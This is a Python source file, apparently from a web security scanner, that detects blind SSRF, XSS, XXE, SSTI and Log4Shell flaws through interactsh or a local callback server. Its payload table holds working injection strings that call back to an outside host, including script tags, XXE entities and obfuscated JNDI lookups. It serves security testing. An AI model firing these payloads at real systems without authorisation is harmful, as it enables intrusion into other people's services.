"""
Vexor Collaborator — Out-of-Band Vulnerability Detection
Detects Blind SSRF, Blind XSS, Blind SQLi via DNS/HTTP callbacks.

Fixed: Uses proper RSA key pair + AES decryption for interactsh v1 API.
Fallback: Uses Vexor's built-in callback server (port 7331) if interactsh is unavailable.
"""
import asyncio
import httpx
import uuid
import base64
import json
import time
import os
from typing import Optional

# Try to import crypto libraries for proper interactsh auth
try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


INTERACTSH_SERVER = "https://oast.pro"   # Public interactsh server (more reliable)
INTERACTSH_API    = f"{INTERACTSH_SERVER}/register"
INTERACTSH_POLL   = f"{INTERACTSH_SERVER}/poll"


class VexorCollaborator:
    """
    Out-of-band vulnerability detector.
    Uses interactsh.com with proper RSA key registration (fixed from original broken version).
    Falls back to built-in callback server on port 7331 if interactsh is unavailable.
    """

    def __init__(self):
        self._correlation_id: Optional[str] = None
        self._secret_key: Optional[str] = None
        self._domain: Optional[str] = None
        self._interactions: list = []
        self._rsa_private_key = None
        self._rsa_public_key_b64: Optional[str] = None
        self._using_builtin = False   # True when using port-7331 fallback

        if HAS_CRYPTO:
            self._generate_rsa_keypair()

    def _generate_rsa_keypair(self) -> None:
        """Generate RSA key pair for interactsh encrypted communication."""
        self._rsa_private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend(),
        )
        pub_bytes = self._rsa_private_key.public_key().public_bytes(
            serialization.Encoding.DER,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        self._rsa_public_key_b64 = base64.b64encode(pub_bytes).decode()

    async def register(self) -> Optional[str]:
        """
        Register with interactsh using proper RSA public key.
        Returns a unique callback domain/URL.
        """
        self._correlation_id = uuid.uuid4().hex[:20]
        self._secret_key = uuid.uuid4().hex

        if HAS_CRYPTO:
            try:
                async with httpx.AsyncClient(timeout=15) as client:
                    payload = {
                        "public-key": self._rsa_public_key_b64,
                        "secret-key": self._secret_key,
                        "correlation-id": self._correlation_id,
                    }
                    resp = await client.post(INTERACTSH_API, json=payload)

                    if resp.status_code == 200:
                        data = resp.json()
                        server = data.get("domain", "oast.pro")
                        self._domain = f"{self._correlation_id}.{server}"
                        self._using_builtin = False
                        return self._domain

            except Exception:
                pass

        # Fallback: use built-in callback server
        return await self._register_builtin()

    async def _register_builtin(self) -> Optional[str]:
        """Use Vexor's built-in callback server as OOB server."""
        from vexor.core.callback_server import get_callback_server
        cb = get_callback_server()
        if not cb.is_running():
            try:
                await cb.start()
            except RuntimeError:
                # Port already in use — server started elsewhere
                pass

        self._using_builtin = True
        # Use local IP + port 7331
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = "127.0.0.1"

        self._domain = f"{local_ip}:7331"
        return self._domain

    def get_payload(self, vuln_type: str = "ssrf") -> dict:
        """Get OOB payloads for different vulnerability types."""
        if not self._correlation_id:
            self._correlation_id = uuid.uuid4().hex[:16]

        if self._using_builtin or not self._domain:
            domain = self._domain or f"127.0.0.1:7331"
        else:
            domain = self._domain

        payloads = {
            "ssrf": [
                f"http://{domain}/",
                f"https://{domain}/",
                f"http://{domain}:80/",
            ],
            "blind_xss": [
                f"<script src='http://{domain}/x'></script>",
                f"<img src='http://{domain}/x' onerror='fetch(\"http://{domain}/\")'>",
                f"javascript:fetch('http://{domain}/')",
                f"'><script src=http://{domain}></script>",
            ],
            "xxe": [
                f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/">]>
<root>&xxe;</root>""",
                f"""<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY % ext SYSTEM "http://{domain}/ext.dtd">%ext;]>
<root/>""",
            ],
            "ssti": [
                f"${{T(java.net.URL).openConnection('http://{domain}/')}}",
                f"#{{@java.net.URL@openConnection('http://{domain}/')}}",
                f"{{request.getClass().forName('java.net.URL').openStream('http://{domain}/')}}",
            ],
            "log4shell": [
                f"${{jndi:ldap://{domain}/a}}",
                f"${{jndi:dns://{domain}/a}}",
                f"${{jndi:rmi://{domain}/a}}",
                f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{domain}/a}}",
            ],
            "deserialization": [
                f"rO0AB...http://{domain}/",  # Java gadget marker
            ],
        }

        return {
            "domain": domain,
            "correlation_id": self._correlation_id,
            "payloads": payloads.get(vuln_type, payloads["ssrf"]),
        }

    async def poll_interactions(self) -> list:
        """Poll for OOB interactions from interactsh or built-in server."""
        if self._using_builtin:
            return self._poll_builtin()

        if not self._correlation_id or not self._secret_key:
            return []

        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.get(
                    INTERACTSH_POLL,
                    params={
                        "id":     self._correlation_id,
                        "secret": self._secret_key,
                    }
                )

                if resp.status_code == 200:
                    data = resp.json()
                    raw_interactions = data.get("data", [])

                    # Decrypt AES-encrypted interaction data if crypto is available
                    interactions = []
                    aes_key_b64  = data.get("aes-key", "")

                    for enc_data in raw_interactions:
                        try:
                            if aes_key_b64 and HAS_CRYPTO and self._rsa_private_key:
                                decrypted = self._decrypt_interaction(enc_data, aes_key_b64)
                                if decrypted:
                                    interactions.append(decrypted)
                            else:
                                interactions.append({"raw": enc_data})
                        except Exception:
                            interactions.append({"raw": enc_data})

                    self._interactions.extend(interactions)
                    return interactions

        except Exception:
            # Fallback to built-in if interactsh unreachable
            return self._poll_builtin()

        return []

    def _decrypt_interaction(self, enc_data: str, aes_key_b64: str) -> Optional[dict]:
        """Decrypt interactsh AES-encrypted interaction data using RSA private key."""
        if not HAS_CRYPTO or not self._rsa_private_key:
            return None
        try:
            # Decrypt AES key with RSA private key
            enc_aes_key = base64.b64decode(aes_key_b64)
            aes_key = self._rsa_private_key.decrypt(
                enc_aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                )
            )

            # Decrypt interaction data with AES key
            raw_bytes = base64.b64decode(enc_data)
            iv   = raw_bytes[:16]
            data = raw_bytes[16:]
            cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
            dec = cipher.decryptor().update(data)

            return json.loads(dec.decode("utf-8", errors="ignore"))
        except Exception:
            return None

    def _poll_builtin(self) -> list:
        """Get new interactions from the built-in callback server."""
        from vexor.core.callback_server import get_callback_server
        cb = get_callback_server()
        hits = cb.get_hits()
        # Only return hits with our correlation_id token (or all if no filter)
        result = []
        for h in hits:
            result.append({
                "protocol":  "http",
                "unique-id": h.token,
                "remote-address": h.source_ip,
                "raw-request": h.data[:500],
                "timestamp": h.timestamp,
                "vuln_type": h.vuln_type,
                "target":    h.target,
                "param":     h.param,
            })
        return result

    async def wait_for_interaction(self, timeout: int = 10) -> Optional[dict]:
        """Poll until we receive an OOB interaction or timeout."""
        start = time.time()
        while time.time() - start < timeout:
            interactions = await self.poll_interactions()
            if interactions:
                return interactions[0]
            await asyncio.sleep(2)
        return None

    def get_all_interactions(self) -> list:
        return list(self._interactions)
